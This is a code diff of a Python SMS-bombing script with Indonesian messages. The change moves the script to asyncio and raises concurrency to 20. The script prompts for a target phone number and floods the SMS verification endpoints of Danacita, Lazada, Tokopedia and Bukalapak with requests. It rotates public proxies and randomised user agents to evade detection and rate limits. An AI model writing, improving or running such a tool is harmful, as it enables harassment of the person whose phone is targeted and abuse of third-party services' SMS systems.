@@ -8,6 +8,8 @@ from colorama import Fore, init
 import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from itertools import cycle
+import aiohttp
+import asyncio
 
 init(autoreset=True)
 
@@ -25,12 +27,6 @@ hijau = "\033[1;92m"
 putih = "\033[1;97m"
 biru = "\033[1;96m"
 kuning = "\033[1;93m"
-
-def autotype(sync):
-    for change in sync + "\n":
-        sys.stdout.write(change)
-        sys.stdout.flush()
-        time.sleep(0.008)
 
 def generate_user_agent():
     browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
@@ -75,81 +71,64 @@ def generate_headers(api_name):
         "User-Agent": generate_user_agent()
     }
 
-def send_request(api_url, headers, data, proxy=None, retry_attempts=5, initial_delay=5):
+async def send_request(api_url, headers, data, session, proxy=None, retry_attempts=3, initial_delay=2):
     for attempt in range(retry_attempts):
         try:
-            response = requests.post(api_url, headers=headers, data=data, proxies=proxy, timeout=10)
-            if response.status_code == 200:
-                logging.info(f"Berhasil mengirim SMS via {api_url} - Attempt {attempt + 1}")
-                print(f"{GreenTerm}Berhasil mengirim SMS via {api_url}")
-                return True
-            else:
-                logging.warning(f"Gagal mengirim SMS via {api_url}. Status code: {response.status_code} - Attempt {attempt + 1}")
-        except requests.RequestException as e:
+            async with session.post(api_url, headers=headers, data=data, proxy=proxy) as response:
+                if response.status == 200:
+                    logging.info(f"Berhasil mengirim SMS via {api_url} - Attempt {attempt + 1}")
+                    print(f"{GreenTerm}Berhasil mengirim SMS via {api_url}")
+                    return True
+                else:
+                    logging.warning(f"Gagal mengirim SMS via {api_url}. Status code: {response.status} - Attempt {attempt + 1}")
+        except Exception as e:
             logging.error(f"Terjadi kesalahan: {e} - Attempt {attempt + 1}")
         
         # Delay dengan backoff eksponensial
-        time.sleep(initial_delay * (2 ** attempt))
+        await asyncio.sleep(initial_delay * (2 ** attempt))
     
     print(f"{RedTerm}Gagal mengirim SMS setelah {retry_attempts} kali percobaan.")
     return False
 
-def get_proxies():
-    # Sumber proxy publik (contoh URL, Anda dapat menggantinya dengan sumber lain)
+async def fetch_proxies():
     proxy_source_url = "https://www.proxy-list.download/api/v1/get?type=https"
     try:
-        response = requests.get(proxy_source_url)
-        if response.status_code == 200:
-            proxy_list = response.text.splitlines()
-            return proxy_list
-    except requests.RequestException as e:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(proxy_source_url) as response:
+                if response.status == 200:
+                    proxy_list = await response.text()
+                    return proxy_list.splitlines()
+    except Exception as e:
         logging.error(f"Terjadi kesalahan saat mengambil daftar proxy: {e}")
     return []
 
-def send_sms(api_name, proxy=None):
-    headers = generate_headers(api_name)
-    data = json.dumps({"username": inputNomer})
-    api_url = api_endpoints.get(api_name)
-    
-    if api_url:
-        if proxy:
-            proxy_dict = {"http": proxy, "https": proxy}
-            return send_request(api_url, headers, data, proxy=proxy_dict)
-        else:
-            return send_request(api_url, headers, data)
+async def main():
+    # Input nomor
+    inputNomer = input(f"{WhiteTerm}[{RedTerm}• {kuning}•{hijau}•{WhiteTerm}] {biru}Nomor Target (ex: +628xxx){WhiteTerm}: ")    
 
-# Input nomor
-inputNomer = input(f"{WhiteTerm}[{RedTerm}• {kuning}•{hijau}•{WhiteTerm}] {biru}Nomor Target (ex: +628xxx){WhiteTerm}: ")    
+    # API endpoints
+    api_endpoints = {
+        "Danacita": "https://api.danacita.co.id/v4/users/mobile_register/",
+        "Lazada": "https://api.lazada.co.id/v1/sms/verify/",
+        "Tokopedia": "https://api.tokopedia.com/v1/sms/verification/",
+        "Bukalapak": "https://api.bukalapak.com/v1/sms/verification/"
+    }
 
-# API endpoints
-api_endpoints = {
-    "Danacita": "https://api.danacita.co.id/v4/users/mobile_register/",
-    "Lazada": "https://api.lazada.co.id/v1/sms/verify/",
-    "Tokopedia": "https://api.tokopedia.com/v1/sms/verification/",
-    "Bukalapak": "https://api.bukalapak.com/v1/sms/verification/"
-}
+    # Parallel processing parameters
+    num_threads = 20
+    proxy_list = await fetch_proxies()
+    proxies = cycle(proxy_list) if proxy_list else cycle([])
 
-# Parallel processing parameters
-num_threads = 10
-proxy_list = get_proxies()  # Get proxy list from the public source
-proxies = cycle(proxy_list) if proxy_list else cycle([])
-
-def get_proxy():
-    return next(proxies)
-
-# Using ThreadPoolExecutor for parallel processing
-with ThreadPoolExecutor(max_workers=num_threads) as executor:
-    while True:
-        futures = []
+    async with aiohttp.ClientSession() as session:
+        tasks = []
         for _ in range(num_threads):
-            delay = random.randint(1, 5)  # Random delay before each batch
-            time.sleep(delay)
-            for api_name in api_endpoints.keys():
-                proxy = get_proxy() if proxy_list else None
-                futures.append(executor.submit(send_sms, api_name, proxy))
+            for api_name, api_url in api_endpoints.items():
+                proxy = next(proxies, None)
+                task = asyncio.ensure_future(send_request(api_url, generate_headers(api_name), json.dumps({"username": inputNomer}), session, proxy))
+                tasks.append(task)
         
-        for future in as_completed(futures):
-            future.result()  # This will raise any exceptions
+        # Execute tasks concurrently
+        await asyncio.gather(*tasks)
 
-        # Delay before the next batch
-        time.sleep(random.randint(10, 30))  # Delay between 10 and 30 seconds
+# Run the main function
+asyncio.run(main())
